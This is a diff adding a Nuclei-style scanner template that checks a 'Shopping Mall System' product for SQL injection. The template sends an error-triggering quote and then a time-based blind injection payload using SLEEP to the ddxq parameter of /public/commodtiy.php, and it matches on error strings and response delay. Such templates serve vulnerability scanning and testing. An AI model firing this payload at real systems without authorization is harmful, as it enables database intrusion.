@@ -1,0 +1,50 @@
+id: poc-yaml-shopping-mall-system-commodtiy-sqli
+info:
+  name: Shopping Mall System Commodity SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /public/commodtiy.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ddxq='
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "mysqli_fetch_assoc()"
+          - "boolean given in"
+
+  - raw:
+      - |
+        POST /public/commodtiy.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ddxq='||(SELECT 0x51677568 WHERE 7422=7422 AND (SELECT 7155 FROM (SELECT (SLEEP({{t1}})))pWQk))||'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"ddh":null}'
+      - type: dsl
+        dsl:
+          - 'duration > to_number(t1)'
+          - 'duration < to_number(t2)'
